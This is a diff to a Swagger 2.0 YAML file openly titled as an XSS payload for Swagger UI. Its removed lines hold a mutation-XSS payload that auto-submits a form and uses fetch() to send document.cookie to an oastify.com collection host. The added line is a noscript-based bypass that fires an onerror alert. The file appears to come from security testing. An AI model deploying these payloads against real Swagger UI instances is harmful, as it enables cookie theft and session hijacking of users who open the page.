@@ -1,11 +1,8 @@
 swagger: '2.0'
 info:
-  title: CSP-Compliant Swagger XSS Payloadd
+  title: CSP-Aware Swagger XSS Payload
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea>
-    </svg></mtext></mglyph></textarea><form action="https://job8rymwzhh80vskwr36etjhj8pzdp1e.oastify.com/log" id="xss">
-      <input autofocus onfocus="fetch('https://job8rymwzhh80vskwr36etjhj8pzdp1e.oastify.com?c='+document.cookie)">
-    </form><script>document.getElementById('xss').submit()</script>
+    <noscript><p title="</noscript><img src=x onerror=alert('bypass')>">
   version: 1.0.0
 paths:
   /test:
